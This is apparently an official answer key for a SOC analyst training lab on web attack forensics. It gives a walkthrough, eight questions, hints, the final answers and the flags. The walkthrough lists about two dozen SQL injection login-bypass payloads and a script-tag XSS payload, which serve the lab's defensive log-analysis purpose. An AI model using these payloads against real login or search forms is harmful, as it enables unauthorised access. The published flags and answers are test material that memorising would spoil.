# 🛡️ SOC Analyst Lab: Web Attack Forensics & IoC Hunting
## Official Question Bank, Hints & Final Answers Key (8 Questions)

---

## 📋 Table of Contents
1. [Part 1: Quick Walkthrough - How to Perform the Lab](#part-1-quick-walkthrough---how-to-perform-the-lab)
2. [Part 2: Official Questions, Hints & Final Answers](#part-2-official-questions-hints--final-answers)
   - [Question 1: SQL Injection Login Bypass Flag](#question-1-sql-injection-login-bypass-flag)
   - [Question 2: HTTP Login Redirection Status Code](#question-2-http-login-redirection-status-code)
   - [Question 3: HTTP Protocol & SQLi Payload Transmission](#question-3-http-protocol--sqli-payload-transmission)
   - [Question 4: Cross-Site Scripting (XSS) Execution Flag](#question-4-cross-site-scripting-xss-execution-flag)
   - [Question 5: Web Server Access Log URL Encoding](#question-5-web-server-access-log-url-encoding)
   - [Question 6: Brute Force HTTP Status Code Spike](#question-6-brute-force-http-status-code-spike)
   - [Question 7: Threat Actor IP Identification](#question-7-threat-actor-ip-identification)
   - [Question 8: Compromised Credential Discovery](#question-8-compromised-credential-discovery)
3. [Part 3: Master Flags & Forensic IoC Summary](#part-3-master-flags--forensic-ioc-summary)

---

## Part 1: Quick Walkthrough - How to Perform the Lab

### 1. Attack 1: SQL Injection (Login Bypass & Forensic IoC Analysis)
1. In the top navigation, ensure you are in the **🌐 Web Application (portal.aegis-corp.com)** tab.
2. Click **"Sign In"** in the top navigation bar to open the corporate Single Sign-On (SSO) login form (`/auth/login`).
3. Inject any SQL injection authentication bypass payload into either the **Username** or **Password** input field:
   - `admin' --`
   - `admin' #`
   - `admin'/*`
   - `admin' or '1'='1`
   - `admin' or '1'='1'--`
   - `admin' or '1'='1'#`
   - `admin' or '1'='1'/*`
   - `admin' or 1=1 or ''='`
   - `admin' or 1=1`
   - `admin' or 1=1--`
   - `admin' or 1=1#`
   - `admin' or 1=1/*`
   - `admin') or ('1'='1`
   - `admin') or ('1'='1'--`
   - `admin') or ('1'='1'#`
   - `admin') or ('1'='1'/*`
   - `admin') or '1'='1`
   - `admin') or '1'='1'--`
   - `admin') or '1'='1'#`
   - `admin') or '1'='1'/*`
   - `1' or '1' = '1`
   - `or 1=1`
   - `or 1=1--`
   - `or 1=1#`
   - `or 1=1/*`
4. Click **Sign In**. The backend query evaluates to `TRUE`, bypassing authentication and returning an **HTTP 302** redirect.
5. The application redirects to the **🛡️ Admin Home Page & System Control Center**. Look inside the green **Administrative Secret Vault** card to retrieve Flag #1:
   **`BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}`**
6. **Find the IoC in the Web Application Log**: Switch to the **🛡️ SOC SIEM Log Monitor** tab.
   - Filter by `uri:*login*` or `status:302` or `rule:RULE-SEC-002`.
   - Locate the `POST /auth/login` request with status code `302`.
   - Click **"Inspect Log"** to review the forensic details:
     * **Request URI**: `/auth/login`
     * **HTTP Method**: `POST`
     * **Response Status**: `302 Found` (Redirection to Admin Home Page)
     * **Payload Location**: `Request Body` (`username=admin' --&password=...`)
     * **SIEM Detection Signature**: `RULE-SEC-002` (`SQL Injection - Authentication Bypass / Tautology Probe`)
     * **Severity**: `CRITICAL`
     * **Client IP**: `203.0.113.195`
7. Paste these retrieved values into **Question 1, Question 2, and Question 3** of the questionnaire below.

---

### 2. Attack 2: Cross-Site Scripting (XSS in Search Bar)
1. In the **🌐 Web Application** tab, navigate to the **Home & Search** view.
2. In the **Enterprise Resource & Asset Search** bar, enter an executable JavaScript payload:
   ```html
   <script>alert('XSS')</script>
   ```
3. Press **Enter** or click **Search**.
4. The unsanitized input is reflected into the DOM, executing within the browser context and triggering a security context modal displaying the exposed session cookie and the XSS challenge flag:
   **`BLITZ{x55_r3fl3ct3d_s34rch_9b42e}`**
5. Switch to the **🛡️ SOC SIEM Log Monitor** tab, click the **XSS** quick filter, and inspect the logged `GET /api/search?q=...` access event to examine the raw URL percent encoding (`%3C` and `%3E`).

---

### 3. Attack 3: Authentication Brute Force Analysis
1. Open the **🛡️ SOC SIEM Log Monitor** tab.
2. Click the **"Brute Force"** filter pill or search for `status:401`.
3. In the status code timeline histogram and log table, observe a rapid spike of consecutive **HTTP 401 Unauthorized** responses targeting `POST /auth/login` from external source IP **`203.0.113.89`**.
4. Inspect the log entries to identify the targeted corporate username: **`sarah_admin`**.
5. Locate the final log entry from that same IP address (`203.0.113.89`) which abruptly transitioned from status **401** to **HTTP 302 Found** (Authentication Success).
6. Click **"Inspect Log"** to review the request body and find the compromised password:
   **`Summer2026!`**

---

## Part 2: Official Questions, Hints & Final Answers

### Question 1: SQL Injection Login Bypass Flag
Perform a SQL injection authentication bypass on the corporate login page (`/auth/login`) using a payload such as `' OR '1'='1` or `admin' --` to gain unauthorized access to the Admin Home Page. What is the administrative secret flag displayed inside the vault?
* **💡 Hint:** Click "Sign In", input `admin' --` or `' OR '1'='1` into the login credentials, and submit. The application redirects to the Admin Home Page where the green Administrative Secret Vault card presents the flag.
* **🎯 Final Answer:** `BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}`

---

### Question 2: HTTP Login Redirection Status Code
In standard web application protocols, what 3xx HTTP redirection status code is returned by the server upon successful authentication to redirect the client's browser to the Admin Home Page?
* **💡 Hint:** Check the SOC SIEM access logs for the successful `/auth/login` request. Web servers issue this standard redirection code (Found / Moved Temporarily) before the browser navigates to the landing dashboard.
* **🎯 Final Answer:** `302` *(also accept: `302 Found`, `302 Redirect`)*

---

### Question 3: HTTP Protocol & SQLi Payload Transmission
When submitting credentials on the login page via a `POST /auth/login` request, in which specific component of the HTTP packet is the SQL injection payload transmitted (unlike `GET` requests which transmit parameters in the URI query string)?
* **💡 Hint:** In HTTP POST requests, form variables and credentials are sent inside the message payload section beneath the HTTP request headers.
* **🎯 Final Answer:** `Request Body` *(also accept: `Body`, `HTTP Body`, `POST Body`)*

---

### Question 4: Cross-Site Scripting (XSS) Execution Flag
Enter an executable JavaScript payload (`<script>alert('XSS')</script>`) into the enterprise resource search bar. What challenge flag is displayed when the unsanitized input is reflected and executed by the browser?
* **💡 Hint:** In the Web Application tab, enter `<script>alert('XSS')</script>` into the search bar and press Enter. A browser execution sandbox modal will trigger displaying the flag.
* **🎯 Final Answer:** `BLITZ{x55_r3fl3ct3d_s34rch_9b42e}`

---

### Question 5: Web Server Access Log URL Encoding
When inspecting raw web server access logs in the SOC SIEM console for the reflected XSS attack on `/api/search?q=`, web browsers URL-encode special characters. What is the two-character hexadecimal percent-encoding representation for the opening angle bracket character (`<`)?
* **💡 Hint:** Open the SIEM console, find the `GET /api/search` XSS log, and inspect the raw URI string. The ASCII code for `<` is 60, which corresponds to this hexadecimal value prefixed by `%`.
* **🎯 Final Answer:** `%3C` *(also accept: `%3c`)*

---

### Question 6: Brute Force HTTP Status Code Spike
During an automated credential stuffing or dictionary brute force attack against a web login portal, which HTTP client error response code spikes rapidly in the SIEM telemetry, signifying failed authentication attempts?
* **💡 Hint:** In HTTP RFC specifications, this 4xx status code officially designates "Unauthorized" when user credentials are missing or invalid.
* **🎯 Final Answer:** `401` *(also accept: `401 Unauthorized`)*

---

### Question 7: Threat Actor IP Identification
Analyze the historical authentication logs in the SOC SIEM console for brute force activity targeting the user account `sarah_admin`. What external source IP address conducted this high-frequency password guessing attack?
* **💡 Hint:** In the SIEM console, search for `status:401` or filter by the "Brute Force" category. Look at the Client IP column of the repeated failed login attempts against `/auth/login`.
* **🎯 Final Answer:** `203.0.113.89`

---

### Question 8: Compromised Credential Discovery
Inspect the request body of the successful authentication event (`HTTP 302`) originating from attacker IP `203.0.113.89` that immediately followed the repeated 401 failures. What cleartext password did the threat actor successfully guess to compromise the account?
* **💡 Hint:** In the SIEM console, locate the single `302` log entry from IP `203.0.113.89` on URI `/auth/login`, click "Inspect Log Details", and examine the `body` field (`username=sarah_admin&password=...`).
* **🎯 Final Answer:** `Summer2026!`

---

## Part 3: Master Flags & Forensic IoC Summary

| Attack Vector | Target Endpoint | Forensic Indicator of Compromise (IoC) | Challenge Flag / Key Detail |
|---|---|---|---|
| **SQL Injection (Login Bypass)** | `POST /auth/login` | Tautology `' OR '1'='1` or comment `--` in body; returns HTTP 302 | `BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}` |
| **Cross-Site Scripting (Reflected)** | `GET /api/search?q=` | Unsanitized script tags encoded as `%3Cscript%3E` in access URI | `BLITZ{x55_r3fl3ct3d_s34rch_9b42e}` |
| **Brute Force (Login)** | `POST /auth/login` | Surge of HTTP 401s followed by anomalous HTTP 302 from single IP | Attacker IP: `203.0.113.89`<br>Password: `Summer2026!` |
